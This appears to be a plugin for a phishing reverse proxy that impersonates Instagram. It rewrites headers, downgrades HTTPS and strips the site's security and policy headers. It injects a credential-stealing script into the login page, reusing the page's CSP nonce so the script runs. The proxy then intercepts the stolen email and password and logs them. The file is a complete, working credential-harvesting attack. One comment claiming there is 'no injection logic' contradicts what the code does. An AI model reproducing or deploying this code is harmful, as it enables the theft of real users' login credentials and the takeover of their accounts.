import io
import json
import re
from dataclasses import dataclass

import zstandard as zstd

# The hostname the client is sending requests to
actual_host: bytes = b""

# Credential stealer script
STEALER_SCRIPT: bytes = b"""document.addEventListener("click",async t=>{const e=t.target.closest("form");if(!e)return;const n=e.querySelectorAll('input[type="text"], input[type="password"]'),o={};n.forEach(t=>{const e=t.name||t.id||"unknown";o[e]=t.value});try{await fetch("/WebTheft-loot",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(o)})}catch(t){}});"""


# HTTP Request and response data class defnitions
@dataclass
class HttpRequest:
    method: bytes
    target: bytes
    headers: list[tuple[bytes, bytes]]
    body: bytes


@dataclass
class HttpResponse:
    status_code: int
    headers: list[tuple[bytes, bytes]]
    body: bytes


def modify_request(request: HttpRequest) -> HttpRequest:

    global actual_host

    # Get route
    log: str = ""  # Log
    log += "[plugins/www.instagram.com:modify_request] %s request for %s\n" % (
        request.method.decode(),
        request.target.decode(),
    )  # Log

    # Get username and password
    if request.target == b"/WebTheft-loot" and request.method == b"POST":
        try:
            _original_body_length = len(request.body)
            login_data = json.loads(request.body)
            log += (
                "[plugins/www.instagram.com:modify_request] Found credentials -> %s:%s\n"
                % (
                    login_data["email"],
                    login_data["pass"],
                )
            )  # Log
            request.body = b" " * _original_body_length
            request.target = b"/robots.txt"
        except Exception:
            pass

    print(log.strip())  # Log

    # Modify headers
    new_headers: list[tuple[bytes, bytes]] = []

    for _hi in range(0, len(request.headers)):
        key, value = request.headers[_hi]

        if key.lower() == b"host":
            if actual_host == b"":
                actual_host = value
            new_headers.append((key, b"www.instagram.com"))
            continue

        if key.lower() == b"origin":
            value = value.replace(actual_host, b"www.instagram.com")
            value = value.replace(b"http:", b"https:")
            new_headers.append((key, value))
            continue

        if key.lower() == b"referer":
            value = value.replace(actual_host, b"www.instagram.com")
            value = value.replace(b"http:", b"https:")
            new_headers.append((key, value))
            continue

        new_headers.append((key, value))

    request.headers = new_headers

    # Do not upgrade to HTTPS
    request.headers = [
        h for h in request.headers if h[0].lower() != b"upgrade-insecure-requests"
    ]

    return request


def modify_response(response: HttpResponse) -> HttpResponse:
    global STEALER_SCRIPT

    log: str = ""

    # If loading the login route inject JS Script
    for key, value in response.headers:
        if key.lower() == b"content-encoding" and value == b"zstd":
            dctx = zstd.ZstdDecompressor()
            reader = dctx.stream_reader(io.BytesIO(response.body))

            cctx = zstd.ZstdCompressor()
            _decoded_body: bytes = reader.read()

            # Extract CSP nonce
            match = re.search(r'nonce="([^"]+)"', _decoded_body.decode(errors="ignore"))
            nonce = b""

            if match:
                nonce = match.group(1).encode().replace(b"'", b"")

            # Log only (no injection logic)
            injected: bytes = (
                b'<script nonce="' + nonce + b'">' + STEALER_SCRIPT + b"</script>"
            )

            if (
                b"<title>Instagram</title>" in _decoded_body
                and response.status_code == 200
            ):
                _decoded_body = _decoded_body.replace(
                    b"</title>", b"</title>" + injected
                )
                log += "[plugins/www.instagram.com:modify_request] Credential stealer script injected\n"

            response.body = cctx.compress(_decoded_body)

    if log != "":
        print(log.strip())

    # Modify headers
    new_headers: list[tuple[bytes, bytes]] = []

    for _hi in range(0, len(response.headers)):
        key, value = response.headers[_hi]

        if key.lower() == b"location":
            value = value.replace(b"www.instagram.com", actual_host)
            value = value.replace(b"https:", b"http:")
            new_headers.append((key, value))
            pass
        elif (
            b"policy" in key.lower()
            or b"security" in key.lower()
            or b"report" in key.lower()
            or b"trial" in key.lower()
        ):
            pass
        else:
            new_headers.append((key, value))

    response.headers = new_headers
    return response
